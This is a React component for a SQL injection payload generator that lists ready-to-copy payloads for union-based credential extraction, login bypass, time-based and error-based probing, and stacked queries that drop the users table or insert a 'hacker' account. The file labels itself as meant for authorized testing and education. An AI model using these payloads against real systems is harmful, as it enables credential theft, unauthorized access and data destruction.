import React, { useState } from 'react';
import type { SqliPayloadData, SqliPayloadCategory } from './tool-types';

const PAYLOADS: Record<SqliPayloadCategory, { name: string; payload: string; description: string }[]> = {
  union: [
    { name: 'Basic Union', payload: "' UNION SELECT NULL--", description: 'Determine column count' },
    { name: 'Union 2 cols', payload: "' UNION SELECT NULL,NULL--", description: 'Two column union' },
    { name: 'Union with data', payload: "' UNION SELECT username,password FROM users--", description: 'Extract data' }
  ],
  boolean: [
    { name: 'Always true', payload: "' OR '1'='1", description: 'Boolean true condition' },
    { name: 'Always false', payload: "' AND '1'='2", description: 'Boolean false condition' },
    { name: 'Comment bypass', payload: "admin'--", description: 'Comment out password check' }
  ],
  time: [
    { name: 'MySQL sleep', payload: "' AND SLEEP(5)--", description: 'Time-based MySQL' },
    { name: 'Postgres delay', payload: "'; SELECT pg_sleep(5)--", description: 'Time-based PostgreSQL' },
    { name: 'MSSQL waitfor', payload: "'; WAITFOR DELAY '0:0:5'--", description: 'Time-based MSSQL' }
  ],
  error: [
    { name: 'Type conversion', payload: "' AND 1=CONVERT(int,(SELECT @@version))--", description: 'MSSQL error' },
    { name: 'XML error', payload: "' AND extractvalue(1,concat(0x7e,version()))--", description: 'MySQL XML error' }
  ],
  stacked: [
    { name: 'Drop table', payload: "'; DROP TABLE users;--", description: 'Destructive - testing only' },
    { name: 'Insert user', payload: "'; INSERT INTO users VALUES('hacker','pass');--", description: 'Data insertion' }
  ]
};

const CATEGORIES: { id: SqliPayloadCategory; label: string }[] = [
  { id: 'union', label: 'Union-Based' },
  { id: 'boolean', label: 'Boolean-Based' },
  { id: 'time', label: 'Time-Based' },
  { id: 'error', label: 'Error-Based' },
  { id: 'stacked', label: 'Stacked Queries' }
];

type Props = {
  data: SqliPayloadData | undefined;
  onChange: (next: SqliPayloadData) => void;
};

const SqliPayloadToolComponent = ({ data, onChange }: Props) => {
  const category: SqliPayloadCategory = data?.category ?? 'boolean';
  const selectedPayload = data?.selectedPayload ?? '';
  const customPayload = data?.customPayload ?? '';
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    const payload = selectedPayload || customPayload;
    if (payload) {
      navigator.clipboard.writeText(payload);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    }
  };

  return (
    <div className="space-y-3">
      <div className="text-xs text-slate-200">SQLi Payload Generator</div>

      <div className="text-[10px] text-amber-300 bg-amber-900/20 border border-amber-800 rounded px-2 py-1.5">
        For authorized security testing and educational purposes only.
      </div>

      <div className="space-y-1">
        <div className="text-[11px] text-slate-400">Category</div>
        <div className="flex flex-wrap gap-1">
          {CATEGORIES.map((cat) => (
            <button
              key={cat.id}
              type="button"
              onClick={() => onChange({ ...data, category: cat.id })}
              className={`rounded px-2 py-1 text-[10px] transition-colors ${
                category === cat.id ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
              }`}
            >
              {cat.label}
            </button>
          ))}
        </div>
      </div>

      <div className="space-y-1 max-h-36 overflow-y-auto">
        {(PAYLOADS[category] || []).map((p, i) => (
          <div
            key={i}
            className="bg-slate-800 rounded p-2 cursor-pointer hover:bg-slate-700"
            onClick={() => onChange({ ...data, selectedPayload: p.payload })}
          >
            <div className="text-[11px] text-emerald-400">{p.name}</div>
            <div className="text-[10px] text-slate-400">{p.description}</div>
          </div>
        ))}
      </div>

      {selectedPayload && (
        <div className="space-y-1">
          <div className="flex items-center justify-between">
            <div className="text-[11px] text-slate-400">Selected Payload</div>
            <button type="button" onClick={handleCopy} className="text-[10px] text-slate-400 hover:text-white">
              {copied ? 'Copied!' : 'Copy'}
            </button>
          </div>
          <div className="bg-slate-900 border border-slate-700 rounded p-2 text-[10px] text-rose-300 font-mono break-all select-all" onClick={handleCopy}>
            {selectedPayload}
          </div>
        </div>
      )}

      <textarea
        value={customPayload}
        onChange={(e) => onChange({ ...data, customPayload: e.target.value })}
        rows={2}
        className="w-full rounded bg-slate-800 text-slate-200 text-xs px-2 py-2 border border-slate-700 focus:outline-none focus:border-emerald-500 font-mono"
        placeholder="Custom payload..."
      />
    </div>
  );
};

export class SqliPayloadTool {
  static Component = SqliPayloadToolComponent;
}
